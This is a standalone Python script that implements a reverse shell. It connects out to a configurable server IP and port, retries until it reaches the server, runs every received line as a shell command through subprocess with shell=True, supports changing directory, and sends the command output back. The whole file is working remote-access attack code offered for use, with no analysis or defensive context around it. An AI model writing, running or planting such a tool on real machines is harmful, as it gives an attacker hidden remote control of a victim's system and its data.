import socket
import subprocess
import os
import time
import sys

def run(server_ip=None, server_port=None, stop_flag: list=None):
    """Start a simple reverse shell to (server_ip, server_port).
    stop_flag: optional single-item list used as a mutable boolean from outer scope.
    """
    SERVER_IP = server_ip or os.getenv("SHELL_SERVER_IP") or '127.0.0.1'
    try:
        SERVER_PORT = int(server_port or os.getenv("SHELL_SERVER_PORT") or 4444)
    except Exception:
        SERVER_PORT = 4444

    cwd = os.getcwd()  # keep track of current working directory
    while True:
        if stop_flag and stop_flag[0]:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(f"[+] Connected from client pid={os.getpid()} cwd={cwd}\n".encode())
            while True:
                data = b""
                while not data.endswith(b"\n"):
                    chunk = s.recv(1024)
                    if not chunk:
                        raise ConnectionError("server closed")
                    data += chunk
                cmd = data.decode(errors="ignore").strip()
                if cmd == "exit":
                    s.close()
                    return
                if cmd.startswith("cd "):
                    path = cmd[3:].strip() or "~"
                    try:
                        os.chdir(os.path.expanduser(path))
                        cwd = os.getcwd()
                        s.sendall(f"[+] Changed dir to {cwd}\n".encode())
                    except Exception as e:
                        s.sendall(f"[-] {e}\n".encode())
                    continue
                # execute command
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=cwd)
                stdout, stderr = proc.communicate()
                try:
                    s.sendall(stdout + stderr)
                except Exception:
                    # attempt to split if huge
                    chunk_size = 16384
                    out = stdout + stderr
                    for i in range(0, len(out), chunk_size):
                        try:
                            s.sendall(out[i:i+chunk_size])
                        except Exception:
                            break
            s.close()
            break
        except Exception:
            time.sleep(1.5)

if __name__ == "__main__":
    ip = None
    port = None
    if len(sys.argv) >= 2:
        ip = sys.argv[1]
    if len(sys.argv) >= 3:
        try:
            port = int(sys.argv[2])
        except Exception:
            port = None
    run(ip, port)
